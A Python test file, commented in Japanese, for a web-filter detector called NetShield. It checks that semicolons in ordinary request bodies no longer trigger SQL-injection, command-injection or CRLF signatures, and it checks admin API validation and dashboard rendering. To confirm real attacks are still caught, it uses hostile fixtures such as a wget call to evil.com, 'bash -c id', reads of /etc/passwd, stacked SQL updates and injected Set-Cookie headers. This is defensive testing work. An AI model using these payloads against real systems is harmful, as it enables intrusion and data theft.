"""
test_sweep_det2_signatures.py — 本文の ';' 前提検知と、シグネチャ系の管理 API/画面の回帰(sweep: det2_signatures 群)。
====================================================================================
· T1(#2 の残り) 本文に直接書かれた ';' の文章/CSV/JSON が sqli-stacked・rce・crlf に当たり、
  1 件 28〜42 点加点されていた。本文では ';' の後に SQL 文の構文・引数付きのコマンド・ヘッダ値の
  形が続く時だけ数える。URL/ヘッダの走査は従来どおり。
· T2 /api/shield/optional_sig は 'on' が JSON の真偽値でなければ 400("false" を ON にしない)。
· T3 /api/shield/paranoia は level 必須。set_paranoia が ok:False なら任意署名の復元も監査記録もしない。
· T4 ダッシュボードが sig_test/sig_add の warnings と、稼働していないカスタム規則の理由を表示する。
入力は無害な文章か、既存テストにある fixture だけを使う。
"""
import re
import tempfile

import dataplane.engine.lifeform.pipeline as P
from dataplane import admin as A
from dataplane.engine.lifeform.pipeline import NetShield, _normalize_for_scan, _normalize_full
from test_sweep_admin_ui import _Admin

# 本文に ';' を直接書いた普通の文章(#2 の repro と det_normalize の残件)
_PROSE_BODIES = (
    b"2024-05-01;Update;alice",                                       # ';' 区切りの CSV 1 行
    b"date;action;user\n2024-05-01;Update;alice",                     # 見出し付きの CSV
    b'{"note":"Looks good; update the changelog before release"}',    # JSON の文章
    b"msg=Thanks%3B+create+the+ticket+tomorrow",                      # urlencoded の文章
    b"review=Bought+two+bowls%3B+cat+loved+them&stars=5",             # レビュー欄
    b"subject=Hello&message=Hi+team%3B+To%3A+everyone+in+sales",      # 問い合わせ欄
)


def _shield(d, **cfg):
    sh = NetShield(state_dir=d)
    sh.cfg["enabled"] = True
    sh.cfg["persist_bans"] = False
    sh.cfg.update(cfg)
    return sh


# ── T1: 本文の ';' は文脈が揃った時だけ数える ─────────────────────────────
def test_t1_semicolon_prose_in_body_scores_zero():
    """#2: 本文の ';' の直後に update/create/cat/to: 等の語が来るだけで、sqli-stacked(28 点)・
    rce(42 点=チャレンジ閾値 40 超え)・crlf(31.5 点)が加点されていた。"""
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        for b in _PROSE_BODIES:
            r = sh.inspect_body("192.0.2.40", b)
            assert r["action"] == "allow", (b, r)
        assert sh._decayed_score(sh._state("192.0.2.40")) == 0


def test_t1_body_semicolon_detections_keep_existing_true_positives():
    """文脈を要求しても、既存テストにある真陽性(test_core の ;update … set / ;bash -c、
    test_logio・test_core の rce/crlf の代表例)は本文でも引き続き当たる。"""
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d, block_score=10000)
        for b, sig in ((b"id=1;update u set p=1", "sqli-stacked"),
                       (b"1;update users set p=1", "sqli-stacked"),
                       (b"x=1;bash -c id", "rce"),
                       (b"x=1||bash -c id", "rce"),
                       (b"x=1&&wget http://evil.com/x", "rce")):
            assert sh.inspect_body("192.0.2.41", b).get("signature") == sig, b
        # 値に符号化した改行(head では ';' になる)の後の既存の真陽性も、本文の走査そのもの
        # (inspect_body と同じ _scan_field(body=True))で拾う(#37: 旧版のこの検査は head の正規化
        # _normalize_for_scan に本文用の正規表現を当てていて、本文の経路の取りこぼしを隠していた)。
        # rce は /etc/passwd が先に traversal に当たるので、rce の照合だけを見る。
        assert sh.inspect_body("192.0.2.42", b"q%0a%0aselect a from b").get("signature") \
            == "sqli-stacked"
        for s in ("1; cat /etc/passwd", "127.0.0.1%0acat /etc/passwd", "x=1;bash -c id"):
            assert sh._scan_field(s, body=True, only=frozenset({"rce"}))[0] == "rce", s
        for s in (b"next=%0d%0aSet-Cookie:%20sid=evil", b"u=%0d%0aLocation:%20http://e",
                  b"x=%0d%0aContent-Type:%20text/html", b"to=a%0aBcc:evil@x"):
            assert sh.inspect_body("192.0.2.43", s).get("signature") == "crlf", s
    # 本文用は head 用の部分集合(名前と並びは同じ・rce/crlf 以外は同じ正規表現)
    assert [n for n, _r in P._SIG_RE_BODY] == [n for n, _r in P._SIG_RE]
    for (n, r1), (_n, r2) in zip(P._SIG_RE, P._SIG_RE_BODY):
        assert n in ("rce", "crlf") or r1 is r2, n


def test_t1_head_scanning_unchanged():
    """URL/ヘッダの走査は従来どおり(本文だけが文脈を要求する)。"""
    with tempfile.TemporaryDirectory() as d:
        sh = _shield(d)
        r = sh.inspect("198.51.100.31", path="/p", query="id=1;update u set p=1")
        assert "sqli-stacked" in r.get("reason", ""), r
        head_re = dict(P._SIG_RE)
        for b in _PROSE_BODIES:
            s = b.decode("ascii")
            head, body = _normalize_for_scan(s), _normalize_full(s, body=True)
            # head の判定は従来の正規表現そのまま(本文用の緩和が head へ漏れない)
            expect = (P._STACKED_RE.search(head) is not None
                      or bool(head_re["rce"].search(head)) or bool(head_re["crlf"].search(head)))
            assert expect and sh._scan_signatures(head)[0] is not None, s
            # 本文フラグは _scan_signatures まで届く
            assert sh._scan_signatures(body, body=True) == (None, 0.0), s


# ── T2: optional_sig の 'on' は JSON の真偽値だけ ─────────────────────────────
def test_t2_optional_sig_route_requires_json_bool():
    """#57 の API 側: ルートが bool(b.get("on")) で "false" を True に変えていた。'on' が
    JSON の true/false でなければ 400 で、任意署名(高誤検知)は ON にならない。"""
    with _Admin() as a:
        assert a.sh.set_optional_signature("ssti", False)["ok"] is True
        for bad in ("false", "true", 1, 0, None):
            code, r = a.post("/api/shield/optional_sig", {"name": "ssti", "on": bad})
            assert code == 400 and r["ok"] is False, (bad, code, r)
            assert not a.sh.cfg["optional_sigs"].get("ssti"), bad
        code, r = a.post("/api/shield/optional_sig", {"name": "ssti"})
        assert code == 400, (code, r)
        code, r = a.post("/api/shield/optional_sig", {"name": "ssti", "on": True})
        assert code == 200 and r["ok"] is True, (code, r)
        assert a.sh.cfg["optional_sigs"]["ssti"] is True


# ── T3: paranoia は level 必須・拒否されたら何も適用しない ──────────────────────
def _audit_count(a):
    return len(a.get("/api/admin_audit")["entries"])


def test_t3_paranoia_route_requires_level():
    """level の無い要求が黙ってレベル 1(任意署名を全 OFF)として実行されていた。"""
    with _Admin() as a:
        assert a.sh.set_paranoia(3)["paranoia"] == 3
        n0, before = _audit_count(a), dict(a.sh.cfg["optional_sigs"])
        for body in ({}, {"optional_sigs": {"ssti": True}}):
            code, r = a.post("/api/shield/paranoia", body)
            assert code == 400 and r["ok"] is False, (body, code, r)
        assert a.sh.cfg["paranoia"] == 3 and a.sh.cfg["optional_sigs"] == before
        assert _audit_count(a) == n0


def test_t3_paranoia_route_stops_when_level_is_rejected():
    """set_paranoia が ok:False を返しても、本文の optional_sigs を適用し、応答を
    paranoia_status()(ok キー無し)で上書きして監査ログへ記録していた。"""
    with _Admin() as a:
        assert a.sh.set_paranoia(3)["paranoia"] == 3
        n0, before = _audit_count(a), dict(a.sh.cfg["optional_sigs"])
        code, r = a.post("/api/shield/paranoia", {"level": "max", "optional_sigs": {"ssti": True}})
        assert r["ok"] is False, (code, r)
        assert a.sh.cfg["paranoia"] == 3 and a.sh.cfg["optional_sigs"] == before
        assert _audit_count(a) == n0


def test_t3_paranoia_route_optional_sig_values_must_be_bool():
    """復元用の optional_sigs も bool(v) で "false" を True にしていた(#57 と同じ穴)。"""
    with _Admin() as a:
        assert a.sh.set_paranoia(1)["paranoia"] == 1
        n0 = _audit_count(a)
        code, r = a.post("/api/shield/paranoia", {"level": 1, "optional_sigs": {"ssti": "false"}})
        assert code == 400 and r["ok"] is False, (code, r)
        assert not a.sh.cfg["optional_sigs"].get("ssti")
        assert _audit_count(a) == n0
        # 正しい形(監査ログの「元に戻す」が送る形)は従来どおり通る
        code, r = a.post("/api/shield/paranoia", {"level": 1, "optional_sigs": {"ssti": True}})
        assert code == 200 and r.get("ok", True) is not False, (code, r)
        assert a.sh.cfg["optional_sigs"].get("ssti") is True


# ── T4: ダッシュボードが warnings と無効な規則の理由を表示する ───────────────────
def _js_fn(page, name):
    m = re.search(r"(?:async )?function %s\(.*?\n\}" % name, page, re.S)
    assert m, "関数 %s が見つからない" % name
    return m.group(0)


def test_t4_dashboard_shows_signature_warnings_escaped():
    """#30 で sig_test/sig_add が warnings(%XX 等は正規化で当たらない)を返すようになったが、
    画面は読んでいなかった。各警告は esc() を通して描く(データを生の HTML へ入れない)。"""
    page = A._HTML
    helper = _js_fn(page, "sigWarnHtml")
    assert "warnings" in helper and re.search(r"\.map\(w=>esc\(w\)\)", helper), helper
    for fn in ("addSig", "testSig"):
        assert "sigWarnHtml(r)" in _js_fn(page, fn), fn


def test_t4_dashboard_marks_inactive_custom_signatures():
    """#55 で一覧の各規則に active/reason が付いたが、画面は稼働中と同じに描いていた。
    active=false の規則には状態バッジと理由(esc 済み)を出す。"""
    page = A._HTML
    body = _js_fn(page, "refreshSigs")
    assert "active===false" in body, body
    assert "esc(c.reason" in body, body
    assert "危険除外" not in body                 # weight 不正・件数上限超過も数える(危険だけではない)
    assert '"停止中":' in page                     # EN 表示の訳もある
